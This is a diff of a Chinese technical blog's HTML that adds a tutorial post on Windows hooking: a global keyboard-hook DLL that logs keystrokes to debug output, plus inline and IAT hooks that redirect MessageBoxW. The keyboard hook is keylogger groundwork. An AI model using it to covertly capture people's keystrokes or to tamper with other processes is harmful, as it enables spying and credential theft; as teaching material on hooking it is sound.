+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>万能神奇Hook:<br>1.系统提供的消息Hook机制<br>2.自定义的Hook汇编技巧</p>
+<blockquote>
+<p>消息钩子例子</p>
+</blockquote>
+<p>1.SetWindowsHookEx设置钩子<br>2.CallNextHookEx为钩子链的下一个程序设置钩子<br>3.UnhookWindowsHookEx卸载钩子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">HHOOK g_Hook;</span><br><span class="line">HMODULE g_hModule;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK KeyboardProc(</span><br><span class="line">	int code,           // 消息类型</span><br><span class="line">	WPARAM wParam,      // 虚拟码</span><br><span class="line">	LPARAM lParam) &#123;    // 按键信息</span><br><span class="line"></span><br><span class="line">	// 判断是否wParam与lParam都有键盘消息，是的话则执行打印操作</span><br><span class="line">	if (code == HC_ACTION)&#123;</span><br><span class="line">		// 将256个虚拟键的状态拷贝到指定的缓冲区中，如果成功则继续</span><br><span class="line">		BYTE KeyState[256] = &#123; 0 &#125;;</span><br><span class="line">		if (GetKeyboardState(KeyState)) &#123;</span><br><span class="line">			// 得到第16–23位，键盘虚拟码</span><br><span class="line">			LONG  KeyInfo = lParam;</span><br><span class="line">			UINT  keyCode = (KeyInfo &gt;&gt; 16) &amp; 0x00ff;</span><br><span class="line">			WCHAR wKeyCode = 0;</span><br><span class="line">			ToAscii((UINT)wParam, keyCode, KeyState, (LPWORD)&amp;wKeyCode, 0);</span><br><span class="line">			// 将其打印出来</span><br><span class="line">			WCHAR szInfo[512] = &#123; 0 &#125;;</span><br><span class="line">			swprintf_s(szInfo, 512, L&quot;Hook_%c&quot;, (char)wKeyCode);</span><br><span class="line">			OutputDebugString(szInfo);</span><br><span class="line">			return 0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return CallNextHookEx(g_Hook, code, wParam, lParam);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL InstallHook() &#123;</span><br><span class="line">	g_Hook = SetWindowsHookEx(</span><br><span class="line">		WH_KEYBOARD,//按键消息的钩子</span><br><span class="line">		KeyboardProc, //回调函数</span><br><span class="line">		g_hModule,</span><br><span class="line">		0);</span><br><span class="line"></span><br><span class="line">	if (NULL == g_Hook)</span><br><span class="line">		return FALSE;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">// 导出函数：卸载钩子</span><br><span class="line">BOOL UninstallHook() &#123;</span><br><span class="line">	if (NULL == g_Hook)</span><br><span class="line">		return FALSE;</span><br><span class="line">	return UnhookWindowsHookEx(g_Hook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">					 )</span><br><span class="line">&#123;</span><br><span class="line">	switch (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	case DLL_PROCESS_ATTACH:</span><br><span class="line">		g_hModule = hModule;</span><br><span class="line">		InstallHook();</span><br><span class="line"></span><br><span class="line">		break;</span><br><span class="line">// 	case DLL_THREAD_ATTACH:</span><br><span class="line">// 	case DLL_THREAD_DETACH:</span><br><span class="line">	case DLL_PROCESS_DETACH:</span><br><span class="line">		//UninstallHook();</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>自定义钩子</p>
+</blockquote>
+<ul>
+<li><p>内联Hook<br>通过修改Opcode 使原本跳转到原函数的地址变成跳转到制定函数的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void UnHook();</span><br><span class="line">void OnHook();</span><br><span class="line">BYTE g_old[5];</span><br><span class="line">BYTE g_New[5] = &#123;0xE9&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int</span><br><span class="line">WINAPI</span><br><span class="line">MyMessageBoxW(</span><br><span class="line">_In_opt_ HWND hWnd,</span><br><span class="line">_In_opt_ LPCWSTR lpText,</span><br><span class="line">_In_opt_ LPCWSTR lpCaption,</span><br><span class="line">_In_ UINT uType)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	lpText = L&quot;你被HOOK了&quot;;</span><br><span class="line">	lpCaption = L&quot;HOOK&quot;;</span><br><span class="line">	//卸载钩子</span><br><span class="line">	UnHook();</span><br><span class="line">	int nRet = MessageBoxW(hWnd, lpText, lpCaption, uType);</span><br><span class="line">	//安装钩子</span><br><span class="line">	OnHook();</span><br><span class="line">	return nRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void OnHook()</span><br><span class="line">&#123;</span><br><span class="line">	//获取MessageBoxW地址</span><br><span class="line">	DWORD dwMsg = (DWORD)MessageBoxW;</span><br><span class="line">	DWORD dwMyMsg = (DWORD)MyMessageBoxW;</span><br><span class="line">	//计算偏移 offset = 目标地址 - jmp所在地址 - 指令长度</span><br><span class="line">	DWORD dwOffset = dwMyMsg - dwMsg - 5;</span><br><span class="line"></span><br><span class="line">	//保存原来的Opcode</span><br><span class="line">	memcpy(g_old, MessageBoxW, 5);</span><br><span class="line">	//构造Hook地址</span><br><span class="line">	*(DWORD*)(g_New + 1) = dwOffset;</span><br><span class="line">	//修改地址</span><br><span class="line">	DWORD dwOld;</span><br><span class="line">	VirtualProtect(MessageBoxW, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">	memcpy(MessageBoxW,g_New,  5);</span><br><span class="line">	VirtualProtect(MessageBoxW, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line">void UnHook()</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwOld;</span><br><span class="line">	VirtualProtect(MessageBoxW, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">	memcpy(MessageBoxW, g_old, 5);</span><br><span class="line">	VirtualProtect(MessageBoxW, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	OnHook();</span><br><span class="line">	MessageBox(0,0,0,0);</span><br><span class="line">	UnHook();</span><br><span class="line">	MessageBox(0, 0, 0, 0);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>IATHook<br>1.通过导入表查询到制定的函数名<br>2.根据函数名制定函数地址<br>3.替换函数地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">typedef int (WINAPI*FP_MSG)(</span><br><span class="line">_In_opt_ HWND hWnd,</span><br><span class="line">_In_opt_ LPCWSTR lpText,</span><br><span class="line">_In_opt_ LPCWSTR lpCaption,</span><br><span class="line">_In_ UINT uType);</span><br><span class="line"></span><br><span class="line">FP_MSG g_MyMsg;</span><br><span class="line">DWORD g_IAT_Addr;</span><br><span class="line">DWORD g_Addr;</span><br><span class="line">int</span><br><span class="line">WINAPI</span><br><span class="line">MyMessageBoxW(</span><br><span class="line">_In_opt_ HWND hWnd,</span><br><span class="line">_In_opt_ LPCWSTR lpText,</span><br><span class="line">_In_opt_ LPCWSTR lpCaption,</span><br><span class="line">_In_ UINT uType)</span><br><span class="line">&#123;</span><br><span class="line">	lpText = L&quot;你被HOOK了&quot;;</span><br><span class="line">	lpCaption = L&quot;HOOK&quot;;</span><br><span class="line"></span><br><span class="line">	return g_MyMsg(hWnd, lpText, lpCaption, uType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void UnHook()</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwOld;</span><br><span class="line">	VirtualProtect((LPVOID)g_IAT_Addr, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line"></span><br><span class="line">	*(DWORD*)g_IAT_Addr = (DWORD)g_MyMsg;</span><br><span class="line"></span><br><span class="line">	VirtualProtect((LPVOID)g_IAT_Addr, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">   INT中函数名的下标与IAT中函数地址是一一对应的</span><br><span class="line">*/</span><br><span class="line">void IAT_hook(char* pFunName,char* pDllName)</span><br><span class="line">&#123;</span><br><span class="line">	//获取加载基址</span><br><span class="line">	HMODULE hMod = GetModuleHandle(NULL);</span><br><span class="line">	DWORD dwImageBase = (DWORD)hMod;</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt = </span><br><span class="line">		(PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + dwImageBase);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DATA_DIRECTORY pImportDir = </span><br><span class="line">		(PIMAGE_DATA_DIRECTORY)</span><br><span class="line">		&amp;pNt-&gt;OptionalHeader.DataDirectory[1];</span><br><span class="line">	//获取导入表地址</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR pImport = </span><br><span class="line">		(PIMAGE_IMPORT_DESCRIPTOR)</span><br><span class="line">		(pImportDir-&gt;VirtualAddress + dwImageBase);</span><br><span class="line">	</span><br><span class="line">	//遍历导入表，查找函数地址的位置</span><br><span class="line">	while (pImport-&gt;Name)</span><br><span class="line">	&#123;</span><br><span class="line">		char* pDll = (char*)(pImport-&gt;Name + dwImageBase);</span><br><span class="line">		//比对模块名（_stricmp比对时不区分大小写）</span><br><span class="line">		if (!_stricmp(pDll, pDllName))</span><br><span class="line">		&#123;</span><br><span class="line">			//IAT找到了</span><br><span class="line">			DWORD* pIAT = (DWORD*)(pImport-&gt;FirstThunk + dwImageBase);</span><br><span class="line">			DWORD* pINT = (DWORD*)(pImport-&gt;OriginalFirstThunk + dwImageBase);</span><br><span class="line"></span><br><span class="line">			while (*pINT)</span><br><span class="line">			&#123;</span><br><span class="line">				//最高位为0是名称导入的</span><br><span class="line">				if (!(*pINT &amp; 0x80000000))</span><br><span class="line">				&#123;</span><br><span class="line">					PIMAGE_IMPORT_BY_NAME pName =</span><br><span class="line">						(PIMAGE_IMPORT_BY_NAME)</span><br><span class="line">						(*pINT + dwImageBase);</span><br><span class="line">					//比对函数名称</span><br><span class="line">					if (!_stricmp(pName-&gt;Name,pFunName))</span><br><span class="line">					&#123;</span><br><span class="line">						//进来说明找到了</span><br><span class="line">						//保存原来的地址用于恢复</span><br><span class="line">						g_IAT_Addr = (DWORD)pIAT;</span><br><span class="line">						//将MessageBoxW地址赋值给函数指针</span><br><span class="line">						g_MyMsg = (FP_MSG)*pIAT;</span><br><span class="line">					    //IAT表的内存属性是只读</span><br><span class="line">						//需要修改内存属性为可写才能修改</span><br><span class="line">						DWORD dwOld;</span><br><span class="line">						VirtualProtect(pIAT, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">						//修改为自己的函数地址</span><br><span class="line">						*pIAT = (DWORD)MyMessageBoxW;</span><br><span class="line">						//恢复原来的属性</span><br><span class="line">						VirtualProtect(pIAT, 4, dwOld, &amp;dwOld);</span><br><span class="line">						return;</span><br><span class="line">						</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				//下一个</span><br><span class="line">				pINT++;</span><br><span class="line">				pIAT++;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		//下一个某块</span><br><span class="line">		pImport++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">					 )</span><br><span class="line">&#123;</span><br><span class="line">	switch (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	case DLL_PROCESS_ATTACH:		</span><br><span class="line">		IAT_hook(&quot;MessageBoxW&quot;,&quot;user32.dll&quot;);</span><br><span class="line">		break;</span><br><span class="line">	//case DLL_THREAD_ATTACH:</span><br><span class="line">	//case DLL_THREAD_DETACH:</span><br><span class="line">	case DLL_PROCESS_DETACH:</span><br><span class="line">		UnHook();</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/Hook原理/">展开全文 >></a>
         </p>
       
 
@@ -1121,15 +1145,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">linux优化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1137,7 +1153,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1145,11 +1161,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Java</a>
+                <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
+                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Java</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1158,6 +1178,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">HOOK技术</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">思考</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1209,15 +1237,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">思考</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1237,11 +1261,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">脱壳</a>
+                <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
+                <a href="javascript:void(0)" class="js-tag color3">脱壳</a>
               </li>
              
               <li class="article-tag-list-item">
